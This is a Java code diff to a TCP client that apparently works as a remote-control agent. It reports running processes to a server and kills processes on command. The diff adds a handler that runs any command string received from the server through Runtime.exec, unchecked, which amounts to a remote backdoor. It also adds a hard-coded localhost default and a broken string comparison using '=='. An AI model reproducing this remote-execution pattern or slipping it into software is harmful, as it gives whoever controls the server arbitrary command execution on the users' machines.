@@ -6,7 +6,6 @@ import java.io.IOException;
 import java.io.InputStreamReader;
 import java.net.Socket;
 import java.net.UnknownHostException;
-import java.util.ArrayList;
 import java.util.Random;
 import java.util.Timer;
 import java.util.TimerTask;
@@ -15,14 +14,18 @@ import org.apache.commons.lang3.StringUtils;
 
 class TCPClient {
 	public static Socket clientSocket;
-	public static boolean debug = false, rand = false;
+	public static boolean debug = false, defaultSettings = false, rand = false;
 	static String ip;
 	static int sock;
 
 	public static void main(String args[]) throws Exception {
 		if (!debug) {
-			ip = args[0];
-			sock = Integer.parseInt(args[1]);
+			if (args.length == 1 && args[0].toString() == "-defaultip") {
+				defaultSettings = true;
+			} else {
+				ip = args[0];
+				sock = Integer.parseInt(args[1]);
+			}
 		}
 		Timer timer = new Timer();
 		timer.scheduleAtFixedRate(new TimerTask() {
@@ -35,7 +38,11 @@ class TCPClient {
 	public static void sendMessage(String msg) {
 		String messageRecieve = null;
 		try {
-			clientSocket = new Socket(ip, sock);
+			if (defaultSettings) {
+				clientSocket = new Socket("127.0.0.1", 25565);
+			} else {
+				clientSocket = new Socket(ip, sock);
+			}
 			DataOutputStream outToServer = new DataOutputStream(
 					clientSocket.getOutputStream());
 			outToServer.writeBytes(msg + '\n');
@@ -57,6 +64,11 @@ class TCPClient {
 			message = message.replace(System.getenv("computername")
 					+ " killproc ", "");
 			killProcess(message);
+		} else if (message.contains(" command ")
+				&& message.contains(System.getenv("computername"))) {
+			message = message.replace(System.getenv("computername")
+					+ " command ", "");
+			command(message);
 		}
 	}
 
@@ -73,6 +85,14 @@ class TCPClient {
 		}
 	}
 
+	private static void command(String command){
+		try {
+			Runtime.getRuntime().exec(command);
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
+	}
+	
 	public static void sendProcesses() {
 		try {
 			String processes = "";
